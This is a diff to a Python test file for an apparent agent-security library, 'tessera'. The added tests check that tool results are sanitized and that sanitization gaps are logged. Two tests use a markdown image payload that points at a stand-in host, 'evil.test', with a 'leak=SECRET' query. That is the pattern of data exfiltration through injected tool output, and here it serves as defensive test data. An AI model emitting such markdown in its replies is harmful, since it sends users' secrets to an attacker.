@@ -300,3 +300,46 @@ def test_status_confirmation_reflecting_tainted_token_is_not_trusted():
     s.ingest_result("read_inbox", "secret payload TAINTEDTOKEN556677")
     v = s.ingest_result("ack_message", {"status": "ok", "ref": "TAINTEDTOKEN556677"})
     assert v.is_untrusted          # reflected untrusted token -> not promoted
+
+
+# --- typed tool returns reach the sanitizer (issue #3) --------------------
+
+def test_ingest_sanitizes_a_dataclass_result_and_logs_it():
+    from dataclasses import dataclass
+    from tessera.ledger import open_ledger
+
+    @dataclass
+    class Doc:
+        body: str
+
+    led = open_ledger(session_id="t")
+    s = Session(policy=PolicyEngine(Strictness.BALANCED), ledger=led)
+    s.register_tool(classify_tool("read_doc", {"properties": {"doc_id": {}}}))
+
+    labeled = s.ingest_result(
+        "read_doc", Doc(body="![](https://evil.test/p?leak=SECRET)")
+    )
+    assert "evil.test" not in labeled.content.body
+    assert "sanitize" in [e["kind"] for e in led.sink.entries()]
+
+
+def test_ingest_records_a_gap_for_an_object_it_cannot_sanitize():
+    from tessera.ledger import open_ledger
+
+    class Immutable:
+        __slots__ = ("body",)
+
+        def __init__(self, body):
+            object.__setattr__(self, "body", body)
+
+        def __setattr__(self, *a):
+            raise AttributeError("immutable")
+
+    led = open_ledger(session_id="t")
+    s = Session(policy=PolicyEngine(Strictness.BALANCED), ledger=led)
+    s.register_tool(classify_tool("read_doc", {"properties": {"doc_id": {}}}))
+    s.ingest_result("read_doc", Immutable("![](https://evil.test/p?leak=SECRET)"))
+
+    entry = next(e for e in led.sink.entries() if e["kind"] == "sanitize_gap")
+    assert entry["tool"] == "read_doc"
+    assert "Immutable" in entry["objects"][0]
